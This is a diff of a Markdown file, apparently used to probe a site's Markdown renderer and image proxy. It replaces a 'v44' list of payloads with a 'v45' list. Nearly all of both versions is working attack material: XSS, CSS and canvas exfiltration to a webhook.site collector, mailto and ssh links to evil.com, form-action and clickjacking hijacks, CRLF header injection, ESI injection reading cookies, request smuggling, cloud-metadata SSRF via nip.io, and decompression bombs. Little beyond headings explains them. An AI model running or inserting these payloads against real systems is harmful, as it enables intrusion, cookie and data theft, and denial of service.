@@ -1,346 +1,271 @@
-# v44: Multi-Vulnerability Hunt
+# v45: Advanced SSRF + Cache Poisoning + Response Manipulation
 
-> Testing ALL vulnerability classes - not just SSRF!
-
----
-
-## 1. Protocol Handler Exploitation
-
-<!-- Can we trigger dangerous protocol handlers? -->
-
-[📧 Click to email](mailto:attacker@evil.com?subject=Leaked&body=Secret%20Data)
-
-[📞 Click to call](tel:+1234567890)
-
-[💬 SMS Link](sms:+1234567890?body=Leaked%20Data)
-
-[📱 FaceTime](facetime:attacker@evil.com)
-
-[💻 SSH Link](ssh://attacker@evil.com)
-
-[📁 FTP Link](ftp://attacker.com/payload)
-
-[🔗 SFTP](sftp://attacker.com/secret)
-
-[📲 Intent (Android)](intent://evil.com#Intent;scheme=https;package=com.android.chrome;end)
-
-[🍎 iOS Deep Link](shortcuts://run-shortcut?name=malicious)
-
-[🎮 Steam](steam://run/480)
-
-[💬 Discord](discord://invite/malicious)
-
-[📺 Zoom](zoommtg://zoom.us/join?confno=123456789)
-
-[🖥️ TeamViewer](teamviewer10://control?device=123456789)
+> Advanced attacks: Cache poisoning, response manipulation, time-based rebinding, ESI injection
 
 ---
 
-## 2. Link Prefetch/Preload Exploitation
+## 1. Cache Poisoning - Stable URL Different Responses
 
-<!-- Can we force browser to prefetch/preconnect to attacker? -->
+### Test: Same URL fetched multiple times to detect caching behavior
 
-<link rel="prefetch" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/link-prefetch">
+![Cache Test 1](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/cache-test-v1.gif)
 
-<link rel="preload" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/link-preload" as="fetch">
+![Cache Test 2](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/cache-test-v1.gif)
 
-<link rel="preconnect" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff">
-
-<link rel="dns-prefetch" href="//f2a2ea2c-e29d-454f-890d-6815bd73f9ff.dnshook.site">
-
-<link rel="stylesheet" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/link-stylesheet.css">
-
-<link rel="import" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/link-import.html">
-
-<link rel="modulepreload" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/module.js">
+![Cache Test 3](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/cache-test-v1.gif)
 
 ---
 
-## 3. Meta Tag Exploitation
+## 2. Content-Type Confusion
 
-<!-- Meta refresh for open redirect -->
+### Serve HTML disguised as image
+![HTML as GIF](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/fake.gif?content=<script>alert(1)</script>)
 
-<meta http-equiv="refresh" content="0;url=https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/meta-refresh">
+### Serve JS disguised as image
+![JS as GIF](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/fake.gif?content=alert(document.domain))
 
-<meta http-equiv="refresh" content="5;url=https://evil.com">
-
-<meta name="referrer" content="unsafe-url">
-
-<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
-
-<meta http-equiv="X-Frame-Options" content="ALLOW-FROM https://evil.com">
-
-<meta http-equiv="Set-Cookie" content="session=hijacked">
-
-<meta http-equiv="Content-Type" content="text/html">
+### SVG with XSS
+![SVG XSS](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/xss.svg?content=<svg><script>alert(1)</script></svg>)
 
 ---
 
-## 4. SVG Use Element for Script Execution
+## 3. Response Header Injection (CRLF)
 
-<!-- SVG use can reference external SVGs with scripts -->
+### Set-Cookie via CRLF
+![CRLF Cookie](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/img.gif%0d%0aSet-Cookie:evil=1)
 
-<svg width="100" height="100">
-<use href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/malicious.svg#payload"></use>
+### Location header via CRLF
+![CRLF Redirect](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/img.gif%0d%0aLocation:https://evil.com)
+
+### X-XSS-Protection disable
+![CRLF XSS](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/img.gif%0d%0aX-XSS-Protection:0)
+
+### Content-Type override
+![CRLF CT](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/img.gif%0d%0aContent-Type:text/html)
+
+---
+
+## 4. SVG Advanced SSRF
+
+### foreignObject with fetch
+```svg
+<svg xmlns="http://www.w3.org/2000/svg">
+  <foreignObject width="100%" height="100%">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <script>fetch('https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/svg-fetch')</script>
+    </body>
+  </foreignObject>
 </svg>
+```
 
-<svg width="100" height="100">
-<use xlink:href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/xlink.svg#x"></use>
-</svg>
+![SVG FO Fetch](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/svg-fo-fetch.svg)
 
-<svg>
-<image href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/svg-image.gif"></image>
-</svg>
+### SVG with use + external stylesheet
+![SVG Use Style](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/svg-use-style.svg)
 
-<svg>
-<foreignObject width="100%" height="100%">
-<body xmlns="http://www.w3.org/1999/xhtml">
-<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/svg-fo-body2.gif">
-</body>
-</foreignObject>
-</svg>
-
-<svg>
-<script href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/svg-script.js"></script>
-</svg>
-
-<svg><a xlink:href="javascript:alert(1)"><text y="20">Click me</text></a></svg>
+### SVG image with CORS bypass attempt
+![SVG CORS](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/svg-cors.svg)
 
 ---
 
-## 5. CSS-Based Data Exfiltration
+## 5. Time-Based DNS Rebinding (Precise Timing)
 
-<!-- CSS can leak data via background-image on attribute selectors -->
+### Fast rebind - 0 TTL
+![0 TTL Rebind](https://f07a7e2a-c1c6-4810-8823-2d56f9e26bb8.rebind-0ttl.dnshook.site/rebind-0.gif)
 
-<style>
-input[value^="a"] { background: url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/css-exfil-a); }
-input[value^="b"] { background: url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/css-exfil-b); }
-@import url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/css-import.css);
-* { background: url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/css-wildcard); }
-</style>
+### 1 second TTL rebind
+![1s TTL Rebind](https://f07a7e2a-c1c6-4810-8823-2d56f9e26bb8.rebind-1s.dnshook.site/rebind-1s.gif)
 
-<div style="background:url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/inline-style)">Test</div>
-
-<div style="list-style-image:url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/list-style)">Test</div>
-
-<div style="cursor:url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/cursor.cur),auto">Cursor</div>
-
-<div style="content:url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/content)">Content</div>
+### Race condition rebind
+![Race Rebind](https://f07a7e2a-c1c6-4810-8823-2d56f9e26bb8.racerebind.dnshook.site/race.gif)
 
 ---
 
-## 6. Open Redirect via Links
+## 6. Cookie/Session Attacks
 
-<!-- GitHub may follow these as redirects -->
+### Attempt to capture cookies from Camo
+![Cookie Capture](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/capture-cookies.gif)
 
-[Protocol-relative redirect](//webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/proto-relative)
-
-[Data URL](data:text/html,<script>location='https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/data-url'</script>)
-
-[Blob URL attempt](blob:https://github.com/12345678-1234-1234-1234-123456789012)
-
-[About URL](about:blank#<script>fetch('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff')</script>)
-
-[View-source](view-source:https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff)
+### Set-Cookie in webhook response (configured server-side)
+![Set Cookie](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/set-cookie-response.gif)
 
 ---
 
-## 7. Clickjacking/UI Redress
+## 7. Edge Side Includes (ESI) Injection
 
-<!-- Overlay elements to trick clicks -->
+### Basic ESI include
+![ESI Basic](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/esi.gif?data=<esi:include src="http://127.0.0.1/"/>)
 
-<div style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:9999">
-<a href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/clickjack" style="display:block;width:100%;height:100%"></a>
-</div>
+### ESI with CDATA
+![ESI CDATA](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/esi2.gif?data=<esi:include src="http://localhost/" />)
 
-<div style="position:absolute;top:100px;left:100px;">
-<a href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/overlay-click">
-<button style="opacity:0.01">Secret Button</button>
-</a>
-</div>
+### ESI vars
+![ESI Vars](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/esi3.gif?data=<esi:vars>$(HTTP_COOKIE)</esi:vars>)
 
 ---
 
-## 8. Form Action Hijack
+## 8. X-Header Manipulation
 
-<!-- Forms that submit to attacker -->
+### X-Forwarded-For to internal
+![XFF Internal](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/xff.gif?xff=127.0.0.1)
 
-<form action="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/form-action" method="POST">
-<input name="secret" value="leaked">
-<input type="submit" value="Submit">
-</form>
+### X-Original-URL for path override
+![X-Original](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/xoriginal.gif)
 
-<form id="leak"><input name="x" form="leak"></form>
-<button form="leak" formaction="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/formaction">Click</button>
-
-<input type="image" src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/input-image.gif" formaction="https://evil.com">
+### X-Rewrite-URL
+![X-Rewrite](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/xrewrite.gif)
 
 ---
 
-## 9. Iframe/Object Embedding
+## 9. Protocol Smuggling in Image URLs
 
-<!-- Can we embed external content? -->
+### HTTP/2 CRLF injection attempt
+![H2 CRLF](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/h2.gif%0d%0aHost:internal)
 
-<iframe src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/iframe"></iframe>
+### HTTP request smuggling via URL
+![Smuggle](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/smuggle.gif?a=1%20HTTP/1.1%0d%0aHost:evil%0d%0a%0d%0aGET%20/admin)
 
-<iframe srcdoc="<img src=https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/srcdoc-img>"></iframe>
-
-<object data="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/object" type="text/html"></object>
-
-<embed src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/embed" type="text/html">
-
-<applet code="evil" archive="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/applet.jar"></applet>
+### Chunked encoding trick
+![Chunked](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/chunked.gif?Transfer-Encoding=chunked)
 
 ---
 
-## 10. Base Tag Hijacking
+## 10. Polyglot Files
 
-<!-- Change base URL for all relative links -->
+### GIF/JS polyglot
+![Polyglot GIF-JS](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/polyglot-gifjs.gif)
 
-<base href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/">
+### PNG/HTML polyglot
+![Polyglot PNG-HTML](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/polyglot-pnghtml.png)
 
-<a href="relative-link">This should go to webhook if base works</a>
-
-<img src="base-hijack.gif">
-
----
-
-## 11. Service Worker Registration
-
-<!-- Can we register a service worker? -->
-
-<script>navigator.serviceWorker.register('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/sw.js')</script>
+### JPEG/PHP polyglot
+![Polyglot JPG-PHP](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/polyglot-jpgphp.jpg)
 
 ---
 
-## 12. WebSocket/EventSource
+## 11. Blind SSRF via Timing
 
-<!-- Real-time data exfil -->
+### Timeout-based internal detection
+![Timeout 1](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/timeout-1.gif?delay=1)
 
-<script>
-new WebSocket('wss://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff');
-new EventSource('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/eventsource');
-</script>
+![Timeout 5](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/timeout-5.gif?delay=5)
 
----
-
-## 13. Portal Element (Chrome)
-
-<portal src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/portal"></portal>
+![Timeout 10](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/timeout-10.gif?delay=10)
 
 ---
 
-## 14. Manifest/Icons
+## 12. URL Obfuscation Techniques
 
-<link rel="manifest" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/manifest.json">
+### Tab character in URL
+![Tab URL](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/ta%09b.gif)
 
-<link rel="icon" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/favicon.ico">
+### Newline in URL
+![Newline URL](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/new%0aline.gif)
 
-<link rel="apple-touch-icon" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/apple-icon.png">
+### Null byte
+![Null URL](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/null%00.gif)
 
----
+### Backspace
+![Backspace URL](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/back%08space.gif)
 
-## 15. Ping Attribute
-
-<a href="#" ping="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/ping-attr">Click to ping</a>
-
----
-
-## 16. Video/Audio Poster/Track
-
-<video poster="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/video-poster.gif">
-<source src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/video.mp4">
-<track src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/track.vtt" kind="captions">
-</video>
-
-<audio src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/audio.mp3"></audio>
+### Unicode right-to-left override
+![RTL URL](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/rtl%E2%80%8F.gif)
 
 ---
 
-## 17. Template/Slot Content Injection
+## 13. IPv6 Advanced
 
-<template>
-<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/template-direct.gif">
-<script>alert(1)</script>
-</template>
+### IPv6 zone ID
+![IPv6 Zone](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/ipv6zone.gif?ip=[::1%25eth0])
 
-<slot name="evil"><img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/slot.gif"></slot>
-
----
-
-## 18. Noscript Fallback
-
-<noscript>
-<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/noscript-direct.gif">
-<meta http-equiv="refresh" content="0;url=https://evil.com">
-</noscript>
+### IPv6 scoped address
+![IPv6 Scoped](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/ipv6scoped.gif?ip=[fe80::1%25lo0])
 
 ---
 
-## 19. Canvas/WebGL Exfil
+## 14. Parser Differential Exploitation
 
-<canvas id="c"></canvas>
-<script>
-var c = document.getElementById('c');
-var ctx = c.getContext('2d');
-var img = new Image();
-img.crossOrigin = 'anonymous';
-img.onload = function() {
-  ctx.drawImage(img, 0, 0);
-  fetch('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/canvas', {
-    method: 'POST',
-    body: c.toDataURL()
-  });
-};
-img.src = 'https://github.com/favicon.ico';
-</script>
+### Multiple @ symbols
+![Multi At](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/multi-at.gif?url=http://a@b@127.0.0.1/)
+
+### Mixed slashes
+![Mixed Slash](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/mixed-slash.gif?url=http:/\127.0.0.1/)
+
+### Colon variants
+![Colon](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/colon.gif?url=http:127.0.0.1/)
+
+### Triple slash
+![Triple](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/triple.gif?url=http:///127.0.0.1/)
 
 ---
 
-## 20. Beacon API
+## 15. Hostname Tricks
 
-<script>navigator.sendBeacon('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/beacon', 'data')</script>
+### Localhost with port in subdomain
+![Port Subdomain](https://127-0-0-1.nip.io:8080/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8.gif)
 
----
+### AWS metadata via DNS
+![AWS DNS](https://169.254.169.254.nip.io/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/aws.gif)
 
-## 21. Relative Path Confusion
+### Localhost alternatives
+![Localtest](http://localtest.me/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/local.gif)
 
-<img src="../../../webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/path-traversal.gif">
-
-<img src="//webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/proto-rel-img.gif">
-
-<a href="\\webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/backslash">Backslash</a>
-
----
-
-## 22. ASCII Smuggling (Lookalike Domains)
-
-<a href="https://ɢithub.com/fake">Fake GitHub (Greek G)</a>
-
-<a href="https://github.cοm/fake">Fake .com (Greek omicron)</a>
-
-<img src="https://ɢithub.com/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/punycode.gif">
+### IPv4 in IPv6 bracket
+![v4inv6](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/v4inv6.gif?ip=[::127.0.0.1])
 
 ---
 
-## 23. BOM/Encoding Tricks
+## 16. Gzip Bomb / Resource Exhaustion
 
-﻿<script>alert(1)</script>
+### 10MB gzip that expands to 10GB
+![Gzip Bomb](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/gzip-bomb.gz)
 
-<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/bom%ef%bb%bf.gif">
+### Deflate bomb
+![Deflate Bomb](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/deflate-bomb.deflate)
 
----
-
-## 24. CRLF Injection
-
-<a href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/%0d%0aSet-Cookie:evil=1">CRLF</a>
-
----
-
-## 25. Simple Working Image (Control)
-
-<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/control-img.gif">
+### Recursive archive
+![Zip Bomb](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/zip-bomb.zip)
 
 ---
 
-**v44 - Hunting ALL vulnerabilities, not just SSRF!**
+## 17. WebP/AVIF Modern Formats
+
+### WebP with XMP metadata containing URL
+![WebP XMP](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/xmp.webp)
+
+### AVIF with SSRF payload
+![AVIF SSRF](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/ssrf.avif)
+
+### HEIC metadata
+![HEIC Meta](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/meta.heic)
+
+---
+
+## 18. HTTP/3 QUIC Testing
+
+### Alt-Svc header injection
+![Alt-Svc](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/alt-svc.gif)
+
+### QUIC protocol hint
+![QUIC](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/quic.gif)
+
+---
+
+## 19. CORS/SOP Bypass Attempts
+
+### Origin header manipulation
+![Origin](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/origin.gif)
+
+### Access-Control-* injection
+![ACAO](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/acao.gif)
+
+---
+
+## 20. Webhook Response Variations
+
+### Simple control (should work)
+![Control](https://webhook.site/f07a7e2a-c1c6-4810-8823-2d56f9e26bb8/control.gif)
+
+---
+
+**v45 - Advanced SSRF, Cache Poisoning, Response Manipulation**
